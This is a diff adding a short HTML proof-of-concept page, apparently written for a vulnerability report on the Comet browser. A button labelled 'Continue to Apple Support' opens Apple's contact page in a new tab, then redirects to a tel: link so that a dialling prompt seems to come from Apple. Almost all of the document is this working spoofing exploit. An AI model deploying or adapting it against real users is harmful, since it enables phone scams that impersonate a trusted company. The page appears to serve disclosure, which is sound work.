@@ -1,0 +1,47 @@
+<!doctype html>
+<html>
+  <head>
+    <title>PoC - Comet Browser Protocol Spoofing</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding: 20px;
+      }
+      .btn {
+        padding: 15px 25px;
+        background: #007aff;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Vulnerability Proof of Concept</h1>
+    <p>
+      <b>Instructions:</b> Click the button below. A new tab (Apple.com) will
+      open. Wait 1 second for the spoofed call prompt.
+    </p>
+
+    <button class="btn" onclick="runExploit()">
+      Continue to Apple Support
+    </button>
+
+    <script>
+      function runExploit() {
+        // Fokus ke tab baru
+        setTimeout(() => {
+          window.open("https://www.apple.com/contact/");
+        }, 100);
+        // Trigger spoofed call prompt
+        setTimeout(() => {
+          document.location = "tel:+62123456789";
+        }, 800);
+      }
+    </script>
+  </body>
+</html>
